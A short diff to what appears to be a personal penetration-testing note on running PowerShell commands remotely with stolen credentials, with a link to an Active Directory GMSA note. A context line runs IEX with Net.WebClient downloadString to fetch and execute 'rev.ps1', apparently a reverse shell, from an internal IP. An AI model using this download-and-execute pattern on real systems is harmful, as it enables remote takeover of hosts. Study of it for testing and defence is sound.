@@ -12,6 +12,8 @@ Invoke-Command -Computer 127.0.0.1 -Credential $cred -ScriptBlock { whoami }
 Invoke-Command -Computer 127.0.0.1 -Credential $cred -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://192.168.1.69/rev.ps1') }
 ```
 
+` zet/20221003150485/README.md `
+
 # Related
 
 - [20221003150486](/zet/20221003150486/README.md) active directory get GMSA service account properties
